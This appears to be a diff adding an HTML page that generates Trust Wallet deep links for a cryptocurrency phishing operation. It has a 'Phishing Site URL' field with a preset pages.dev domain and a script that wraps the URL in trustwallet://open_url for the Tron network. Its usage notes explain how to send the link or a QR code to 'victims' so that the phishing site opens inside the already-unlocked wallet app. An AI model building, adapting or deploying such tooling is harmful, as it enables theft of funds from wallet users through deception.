@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Deep Link Generator - Trust Wallet</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:#0c0e13;color:#d7dae1;min-height:100vh;padding:20px}
+.container{max-width:640px;margin:0 auto}
+h1{font-size:16px;letter-spacing:1px;color:#6ee7a8;margin-bottom:20px;text-transform:uppercase}
+.card{background:#161a22;border:1px solid #252b36;border-radius:12px;padding:20px;margin-bottom:20px}
+label{display:block;font-size:13px;color:#9aa4b2;margin-bottom:6px}
+input[type="text"]{width:100%;background:#0c0e13;border:1px solid #252b36;border-radius:8px;padding:12px;font:inherit;color:#d7dae1;outline:none}
+input:focus{border-color:#3b82f6}
+button{background:#1d4ed8;border:none;border-radius:8px;padding:12px 20px;font:inherit;color:#fff;cursor:pointer;font-weight:600;width:100%}
+button:hover{background:#2563eb}
+.output{background:#0c0e13;border:1px solid #252b36;border-radius:8px;padding:12px;margin-top:12px;font-family:ui-monospace,monospace;font-size:12px;word-break:break-all;min-height:60px;position:relative}
+.copyBtn{position:absolute;right:8px;top:8px;background:#14532d;border:none;border-radius:4px;padding:4px 8px;font-size:11px;color:#86efac;cursor:pointer}
+.copyBtn:hover{background:#166534}
+.success{background:#14532d;border:1px solid #166534;color:#86efac;padding:12px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.success.show{display:block}
+.help{font-size:12px;color:#6b7484;margin-top:4px}
+.row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
+.row > *{flex:1;min-width:140px}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Trust Wallet Deep Link Generator</h1>
+
+  <div class="card">
+    <label>Phishing Site URL</label>
+    <input type="text" id="siteUrl" placeholder="https://your-domain.pages.dev" value="https://sendnow-usdt.pages.dev">
+    <div class="help">Your deployed Cloudflare Pages URL. This gets wrapped in trustwallet://open_url</div>
+  </div>
+
+  <div class="card">
+    <label>Coin ID (Tron = 20000714)</label>
+    <input type="text" id="coinId" value="20000714" readonly style="background:#1a1e28;color:#6ee7a8">
+    <div class="help">Fixed for Tron mainnet. Don't change unless you know what you're doing.</div>
+  </div>
+
+  <button onclick="generate()">Generate Deep Link</button>
+
+  <div id="output" class="output">
+    <button class="copyBtn" onclick="copyLink()">Copy</button>
+    <div id="linkText"></div>
+  </div>
+
+  <div id="success" class="success"></div>
+
+  <div class="card">
+    <h3 style="font-size:13px;color:#9aa4b2;margin-bottom:12px;font-weight:400">Usage</h3>
+    <div style="font-size:12px;color:#d7dae1;line-height:1.8">
+      <strong>Chat/Telegram:</strong> Send the generated link directly. When victim taps on mobile with Trust Wallet installed, it opens the URL inside Trust Wallet's in-app browser (wallet already unlocked).<br><br>
+      <strong>QR Code:</strong> Use <code>qr/qr.html</code> with the same site URL. Trust Wallet's QR scanner opens the link directly in-app — no deep link wrapper needed.<br><br>
+      <strong>Format:</strong> <code>trustwallet://open_url?coin_id=20000714&url=ENCODED_URL</code>
+    </div>
+  </div>
+</div>
+
+<script>
+function generate() {
+  const siteUrl = document.getElementById('siteUrl').value.trim();
+  const coinId = document.getElementById('coinId').value.trim();
+
+  if (!siteUrl) { alert('Enter site URL'); return; }
+
+  const encodedUrl = encodeURIComponent(siteUrl);
+  const deepLink = `trustwallet://open_url?coin_id=${coinId}&url=${encodedUrl}`;
+
+  document.getElementById('linkText').textContent = deepLink;
+  document.getElementById('success').textContent = 'Deep link generated! Tap Copy to copy to clipboard.';
+  document.getElementById('success').classList.add('show');
+}
+
+function copyLink() {
+  const text = document.getElementById('linkText').textContent;
+  if (!text) return;
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = document.querySelector('.copyBtn');
+    const original = btn.textContent;
+    btn.textContent = 'Copied!';
+    setTimeout(() => btn.textContent = original, 1500);
+  });
+}
+</script>
+</body>
+</html>
